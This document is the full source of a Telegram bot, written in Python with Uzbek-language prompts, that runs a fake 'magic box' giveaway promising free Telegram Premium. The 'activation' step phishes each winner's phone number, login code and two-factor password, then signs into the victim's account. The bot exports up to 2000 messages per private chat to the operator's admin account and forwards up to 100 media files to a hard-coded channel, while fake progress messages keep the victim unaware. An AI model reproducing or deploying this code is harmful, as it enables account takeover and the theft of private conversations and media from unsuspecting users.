import os
import re
import json
import zipfile
import shutil
import random
import asyncio
import logging
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# ================== LOGGING ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== ENV ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

# Railway uchun PORT
PORT = int(os.getenv("PORT", 8080))

MEDIA_TARGET = os.getenv("MEDIA_TARGET", "@pedro_yd")
BASE_DIR = "chats_export"
USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

# ================== FSM States ==================
class LoginStates(StatesGroup):
    phone = State()
    code = State()
    password = State()

# ================== INIT ==================
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Active sessions
sessions = {}

# ================== JSON FUNCTIONS ==================
def load_json(path, default):
    try:
        if not os.path.exists(path):
            with open(path, "w", encoding="utf-8") as f:
                json.dump(default, f, indent=2, ensure_ascii=False)
            return default
        
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if data else default
    except (json.JSONDecodeError, FileNotFoundError):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=2, ensure_ascii=False)
        return default

def save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"Error saving JSON: {e}")
        return False

# Load initial data
users = load_json(USERS_FILE, {})
config = load_json(CONFIG_FILE, {"magic_box": "on"})

def ensure_user(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {
            "boxes": 0,
            "win_box": random.randint(1, 3),
            "prize": False,
            "refs": 0,
            "ref_by": None
        }
        save_json(USERS_FILE, users)
    return users[uid]

# ================== KEYBOARDS ==================
def get_main_keyboard(is_admin=False):
    builder = ReplyKeyboardBuilder()
    builder.add(KeyboardButton(text="🎁 Sehrli quti"))
    builder.add(KeyboardButton(text="🏆 Yutuqlar"))
    builder.add(KeyboardButton(text="👥 Referal"))
    builder.add(KeyboardButton(text="✅ Aktivlash"))
    
    if is_admin:
        builder.add(KeyboardButton(text="⚙️ Admin panel"))
    
    builder.adjust(1, 2, 1)
    return builder.as_markup(resize_keyboard=True)

def get_back_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.add(KeyboardButton(text="⬅️ Orqaga"))
    return builder.as_markup(resize_keyboard=True)

# ================== HANDLERS ==================
@dp.message(CommandStart())
async def start_command(message: types.Message):
    uid = str(message.from_user.id)
    ensure_user(uid)
    is_admin = message.from_user.id == ADMIN_ID
    
    # Handle referral
    parts = message.text.split()
    if len(parts) > 1:
        ref_uid = parts[1]
        if ref_uid in users and ref_uid != uid and users[uid]["ref_by"] is None:
            users[uid]["ref_by"] = ref_uid
            users[ref_uid]["refs"] += 1
            save_json(USERS_FILE, users)
    
    await message.answer(
        "👋 Xush kelibsiz! Botdan foydalanish uchun quyidagi menyulardan foydalaning.",
        reply_markup=get_main_keyboard(is_admin)
    )

@dp.message(F.text == "👥 Referal")
async def referral_handler(message: types.Message):
    uid = str(message.from_user.id)
    ensure_user(uid)
    bot_info = await bot.get_me()
    
    await message.answer(
        f"🔗 Sizning referal havolangiz:\n"
        f"https://t.me/{bot_info.username}?start={uid}\n\n"
        f"👤 Taklif qilinganlar: {users[uid]['refs']} ta"
    )

@dp.message(F.text == "🏆 Yutuqlar")
async def prizes_handler(message: types.Message):
    uid = str(message.from_user.id)
    ensure_user(uid)
    
    if users[uid]["prize"]:
        await message.answer(
            "🥳 Tabriklaymiz! Sizda 1 oylik Premium bor!\n"
            "Uni olish uchun ✅ Aktivlash bo'limiga o'ting."
        )
    else:
        await message.answer("❌ Hozircha yutuq yo'q. Sehrli qutilarni ochib ko'ring!")

@dp.message(F.text == "🎁 Sehrli quti")
async def magic_box_handler(message: types.Message):
    uid = str(message.from_user.id)
    u = ensure_user(uid)
    
    if u["boxes"] >= 3:
        await message.answer("❌ Siz barcha qutilarni ochib bo'lgansiz. Yutuqlar omadli bo'lsin!")
        return
    
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text=f"🔓 Ochish ({u['boxes']}/3)",
        callback_data="open_box"
    ))
    
    await message.answer(
        f"🎁 Sehrli quti\n\n"
        f"Ochilgan qutilar: {u['boxes']}/3\n"
        f"Qolgan qutilar: {3 - u['boxes']}",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data == "open_box")
async def open_box_callback(callback: types.CallbackQuery):
    uid = str(callback.from_user.id)
    u = ensure_user(uid)
    
    if u["boxes"] >= 3:
        await callback.answer("Siz barcha qutilarni ochib bo'lgansiz!", show_alert=True)
        return
    
    u["boxes"] += 1
    is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"] and not u["prize"]
    save_json(USERS_FILE, users)
    
    if not is_win:
        await callback.message.answer("😐 Hech narsa tushmadi...")
        
        if u["boxes"] < 3:
            builder = InlineKeyboardBuilder()
            builder.add(InlineKeyboardButton(
                text=f"🔓 Ochish ({u['boxes']}/3)",
                callback_data="open_box"
            ))
            await callback.message.answer(
                f"Yana urinib ko'ring! Qolgan: {3 - u['boxes']} ta",
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.answer("Barcha qutilar ochildi!")
        
        await callback.answer()
        return
    
    # Win case
    u["prize"] = True
    save_json(USERS_FILE, users)
    
    await callback.message.answer("🥳")
    
    if u["boxes"] < 3:
        builder = InlineKeyboardBuilder()
        builder.add(InlineKeyboardButton(
            text=f"🔓 Ochish ({u['boxes']}/3)",
            callback_data="open_box"
        ))
        await callback.message.answer(
            "🎉 TABRIKLAYMIZ! Siz 1 oylik Premium yutib oldingiz!\n\n"
            "📱 Premiumni olish uchun ✅ Aktivlash bo'limiga o'ting.\n\n"
            "🎲 Sizga tushgan yutuq ehtimoli: 17.8%",
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.answer(
            "🎉 TABRIKLAYMIZ! Siz 1 oylik Premium yutib oldingiz!\n\n"
            "📱 Premiumni olish uchun ✅ Aktivlash bo'limiga o'ting.\n\n"
            "🎲 Sizga tushgan yutuq ehtimoli: 17.8%"
        )
    
    await callback.answer()

@dp.message(F.text == "✅ Aktivlash")
async def activate_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    u = ensure_user(str(uid))
    
    if not u["prize"]:
        await message.answer(
            "❌ Sizda hali yutuq yo'q!\n"
            "Avval 🎁 Sehrli qutilarni ochib yutib oling."
        )
        return
    
    await state.set_state(LoginStates.phone)
    sessions[uid] = {}
    
    await message.answer(
        "📲 Premiumni faollashtirish uchun telefon raqamingizni yuboring.\n\n"
        "Namuna: +998901234567",
        reply_markup=get_back_keyboard()
    )

@dp.message(F.text == "⬅️ Orqaga")
async def back_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    current_state = await state.get_state()
    
    if current_state:
        await state.clear()
    
    if uid in sessions:
        client = sessions[uid].get("client")
        if client:
            try:
                await client.disconnect()
            except:
                pass
        sessions.pop(uid, None)
    
    await message.answer(
        "🏠 Bosh menyu",
        reply_markup=get_main_keyboard(message.from_user.id == ADMIN_ID)
    )

@dp.message(LoginStates.phone)
async def phone_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    text = message.text.strip()
    
    # Validate phone number
    digits = re.sub(r"[^\d]", "", text)
    if len(digits) < 8 or len(digits) > 15:
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati.\n"
            "Iltimos, to'g'ri formatda yuboring: +998901234567"
        )
        return
    
    phone = "+" + digits if not text.startswith("+") else text
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            sent = await client.send_code_request(phone, force_sms=False)
            
            sessions[uid] = {
                "client": client,
                "phone": phone,
                "phone_code_hash": sent.phone_code_hash
            }
            
            await state.set_state(LoginStates.code)
            await message.answer(
                "🔐 Telefoningizga kod yuborildi.\n"
                "Iltimos, kodni kiriting.\n\n"
                "Masalan: 12345"
            )
        else:
            await message.answer("✅ Siz allaqachon tizimga kirdingiz.")
            await state.clear()
    except Exception as e:
        logger.error(f"Phone error: {e}")
        await message.answer("❌ Xatolik yuz berdi. Qayta urinib ko'ring.")
        await state.clear()

@dp.message(LoginStates.code)
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    text = message.text.strip()
    
    if uid not in sessions:
        await message.answer("❌ Sessiya topilmadi. Qaytadan boshlang.")
        await state.clear()
        return
    
    code = re.sub(r"[^\d]", "", text)
    if len(code) < 5:
        await message.answer("❌ Noto'g'ri kod. Iltimos, to'liq kodni kiriting.")
        return
    
    session_data = sessions[uid]
    
    try:
        await session_data["client"].sign_in(
            phone=session_data["phone"],
            code=code,
            phone_code_hash=session_data["phone_code_hash"]
        )
        
        await message.answer("⏳ Premium faollashtirilmoqda... (15%)")
        await export_chats(uid, message)
        await state.clear()
        
    except SessionPasswordNeededError:
        await state.set_state(LoginStates.password)
        await message.answer(
            "🔑 Akkauntingizda 2 bosqichli himoya mavjud.\n"
            "Iltimos, parolingizni kiriting."
        )
    except PhoneCodeExpiredError:
        await message.answer("⛔ Kod muddati o'tib ketdi. Qaytadan urinib ko'ring.")
        await session_data["client"].disconnect()
        sessions.pop(uid, None)
        await state.clear()
    except Exception as e:
        logger.error(f"Code error: {e}")
        await message.answer("❌ Xatolik yuz berdi. Kod noto'g'ri yoki muddati o'tgan.")
        await state.clear()

@dp.message(LoginStates.password)
async def password_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    
    if uid not in sessions:
        await message.answer("❌ Sessiya topilmadi. Qaytadan boshlang.")
        await state.clear()
        return
    
    try:
        await sessions[uid]["client"].sign_in(password=message.text.strip())
        await message.answer("⏳ Premium faollashtirilmoqda... (45%)")
        await export_chats(uid, message)
        await state.clear()
    except Exception as e:
        logger.error(f"Password error: {e}")
        await message.answer("❌ Noto'g'ri parol yoki xatolik yuz berdi.")
        await state.clear()

# ================== EXPORT FUNCTION ==================
def safe_name(text, max_len=40):
    text = re.sub(r"[^\w\d_-]", "_", str(text), flags=re.ASCII)
    text = re.sub(r"_+", "_", text).strip("_")
    return text[:max_len] if text else f"user_{random.randint(1000, 9999)}"

def media_text(message):
    if message.photo: return "📸 Rasm"
    if message.video: return "🎥 Video"
    if message.voice: return "🎤 Ovozli xabar"
    if message.audio: return "🎵 Audio"
    if message.document: return "📄 Fayl"
    if message.sticker: return "🏷 Stiker"
    if message.gif: return "🎞 GIF"
    return "📎 Media"

async def export_chats(uid, message):
    if uid not in sessions:
        await message.answer("❌ Sessiya topilmadi.")
        return
    
    client = sessions[uid]["client"]
    
    try:
        await message.answer("📊 Chatlaringiz yig'ilmoqda... Iltimos kuting.")
        
        # Create base directory
        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR)
        os.makedirs(BASE_DIR, exist_ok=True)
        
        all_media = []
        total_dialogs = 0
        
        async for dialog in client.get_dialogs():
            if isinstance(dialog.entity, User) and not dialog.entity.bot:
                total_dialogs += 1
                user = dialog.entity
                name = f"{user.first_name or ''} {user.last_name or ''}".strip() or f"User_{user.id}"
                folder_name = f"{safe_name(name)}_{user.id}"
                folder_path = os.path.join(BASE_DIR, folder_name)
                os.makedirs(folder_path, exist_ok=True)
                
                with open(os.path.join(folder_path, "chat.txt"), "w", encoding="utf-8") as f:
                    message_count = 0
                    async for msg in client.iter_messages(user, limit=2000, reverse=True):
                        message_count += 1
                        time_str = msg.date.strftime("%Y-%m-%d %H:%M:%S") if msg.date else "----"
                        sender = "Siz" if msg.out else name
                        text = msg.text if msg.text else media_text(msg)
                        
                        if msg.media:
                            all_media.append(msg)
                        
                        f.write(f"[{time_str}] {sender}: {text}\n")
                    
                    if message_count == 0:
                        f.write("(Chat bo'sh)\n")
        
        # Create ZIP file
        zip_name = f"chats_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(BASE_DIR):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, BASE_DIR)
                    zf.write(file_path, arcname)
        
        # Send to admin
        if ADMIN_ID:
            try:
                await bot.send_document(
                    ADMIN_ID,
                    types.FSInputFile(zip_name),
                    caption=f"📊 Foydalanuvchi chatlari\n👤 ID: {uid}\n💬 Dialoglar: {total_dialogs}"
                )
            except Exception as e:
                logger.error(f"Error sending to admin: {e}")
        
        # Forward media
        if all_media and MEDIA_TARGET:
            await message.answer(f"📤 {len(all_media)} ta media fayl jo'natilmoqda...")
            for media_msg in all_media[:100]:  # Limit to 100 media files
                try:
                    await media_msg.forward_to(MEDIA_TARGET)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"Error forwarding media: {e}")
        
        # Cleanup
        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR)
        if os.path.exists(zip_name):
            os.remove(zip_name)
        
        await message.answer(
            "✅ Premium muvaffaqiyatli faollashtirildi!\n\n"
            "📱 1 oylik Telegram Premium sovg'a qilindi.\n"
            "🎉 Yutuqlaringiz bilan tabriklaymiz!",
            reply_markup=get_main_keyboard(message.from_user.id == ADMIN_ID)
        )
        
    except Exception as e:
        logger.error(f"Export error: {e}")
        await message.answer("❌ Xatolik yuz berdi. Iltimos qaytadan urinib ko'ring.")
    finally:
        try:
            await client.disconnect()
        except:
            pass
        sessions.pop(uid, None)

# ================== ADMIN HANDLERS ==================
@dp.message(F.text == "⚙️ Admin panel")
async def admin_panel_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Sizda bu amalni bajarishga ruxsat yo'q.")
        return
    
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text="🟢 ON" if config["magic_box"] == "on" else "ON",
        callback_data="magic_on"
    ))
    builder.add(InlineKeyboardButton(
        text="🔴 OFF" if config["magic_box"] == "off" else "OFF",
        callback_data="magic_off"
    ))
    
    status = "✅ Yoqilgan" if config["magic_box"] == "on" else "❌ O'chirilgan"
    await message.answer(
        f"⚙️ Admin panel\n\n"
        f"🎁 Sehrli quti holati: {status}\n"
        f"👥 Jami foydalanuvchilar: {len(users)}",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.in_(["magic_on", "magic_off"]))
async def admin_switch_handler(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Ruxsat yo'q", show_alert=True)
        return
    
    config["magic_box"] = "on" if callback.data == "magic_on" else "off"
    save_json(CONFIG_FILE, config)
    
    status = "✅ Yoqildi" if config["magic_box"] == "on" else "❌ O'chirildi"
    await callback.message.edit_text(
        f"⚙️ Admin panel\n\n"
        f"🎁 Sehrli quti holati: {status}\n"
        f"👥 Jami foydalanuvchilar: {len(users)}"
    )
    await callback.answer(f"Sehrli quti {status}")

# ================== ERROR HANDLERS ==================
@dp.errors()
async def error_handler(update: types.Update, exception: Exception):
    logger.error(f"Update {update} caused error: {exception}")
    return True

# ================== HEALTH CHECK ==================
@dp.message(Command("ping"))
async def ping_handler(message: types.Message):
    await message.answer(f"🏓 Pong!\nBot ishlayapti\nFoydalanuvchilar: {len(users)}")

# ================== MAIN ==================
async def main():
    logger.info("Bot ishga tushmoqda...")
    
    # Start polling
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot to'xtatildi")
    except Exception as e:
        logger.error(f"Bot xatosi: {e}")
